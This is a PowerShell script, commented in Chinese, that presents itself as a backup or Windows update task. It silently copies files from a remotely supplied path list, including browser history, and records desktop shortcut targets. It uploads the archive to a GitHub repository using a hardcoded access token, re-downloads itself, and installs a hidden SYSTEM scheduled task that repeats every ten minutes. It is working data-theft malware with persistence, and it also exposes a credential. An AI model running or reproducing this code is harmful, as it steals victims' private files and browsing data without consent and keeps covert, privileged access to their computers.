# ==================== 基本配置 ====================
$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
$logPath = "C:\ProgramData\upload_log.txt"
$token = "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"  # ✅ 请替换为你自己的 Token
$repo = "drftghy/backup-files"

# 设置输出编码
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

"[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File $logPath -Append

# ==================== 下载自身副本 ====================
try {
    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
    "[OK] install.ps1 downloaded to $localPath" | Out-File $logPath -Append
} catch {
    "❌ Failed to download install.ps1: $($_.Exception.Message)" | Out-File $logPath -Append
    return
}

# ==================== 上传打包文件 ====================
try {
    $now = Get-Date
    $timestamp = $now.ToString("yyyy-MM-dd-HHmmss-fff")
    $date = $now.ToString("yyyy-MM-dd")
    $computerName = $env:COMPUTERNAME
    $tag = "backup-$computerName-$timestamp"
    $releaseName = "Backup - $computerName - $date"
    $tempRoot = "$env:TEMP\package-$computerName-$timestamp"
    $zipName = "package-$computerName-$timestamp.zip"
    $zipPath = Join-Path $env:TEMP $zipName

    New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

    # 读取文件列表
    $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }

    $index = 0
    foreach ($path in $pathList) {
        $index++
        $name = "item$index"
        if (-not (Test-Path $path)) { continue }
        $dest = Join-Path $tempRoot $name

        try {
            if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
                $srcDir = Split-Path $path
                robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            } elseif (Test-Path $path -PathType Container) {
                Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
            } else {
                Copy-Item $path -Destination $dest -Force -ErrorAction Stop
            }
        } catch {
            "❌ Failed to copy $path: $($_.Exception.Message)" | Out-File $logPath -Append
        }
    }

    # 提取桌面快捷方式
    try {
        $desktop = [Environment]::GetFolderPath("Desktop")
        $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
        $lnkReport = ""
        foreach ($lnk in $lnkFiles) {
            $shell = New-Object -ComObject WScript.Shell
            $shortcut = $shell.CreateShortcut($lnk.FullName)
            $lnkReport += "[$($lnk.Name)]`nTargetPath: $($shortcut.TargetPath)`nArguments: $($shortcut.Arguments)`nStartIn: $($shortcut.WorkingDirectory)`nIcon: $($shortcut.IconLocation)`n-----------`n"
        }
        $lnkReport | Out-File "$tempRoot\lnk_info.txt" -Encoding utf8
    } catch {
        "⚠️ Shortcut parsing failed: $($_.Exception.Message)" | Out-File $logPath -Append
    }

    # 压缩
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop

    # 创建 GitHub Release
    $releaseData = @{
        tag_name = $tag
        name = $releaseName
        body = "Automated file package from $computerName on $date"
        draft = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3

    $headers = @{
        Authorization = "token $token"
        "User-Agent" = "PowerShellScript"
        Accept = "application/vnd.github.v3+json"
    }

    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"

    # 上传文件
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes

    "[OK] Upload successful." | Out-File $logPath -Append
} catch {
    "❌ Upload failed: $($_.Exception.Message)" | Out-File $logPath -Append
}

# 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# ==================== 注册计划任务（每10分钟执行） ====================
try {
    $taskName = "UploaderTask"
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        "[OK] Existing task removed." | Out-File $logPath -Append
    }

    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
    $trigger.Repetition.Interval = (New-TimeSpan -Minutes 10)
    $trigger.Repetition.Duration = [TimeSpan]::MaxValue
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
    "[OK] Scheduled task registered." | Out-File $logPath -Append
} catch {
    "❌ Scheduled task registration failed: $($_.Exception.Message)" | Out-File $logPath -Append
}
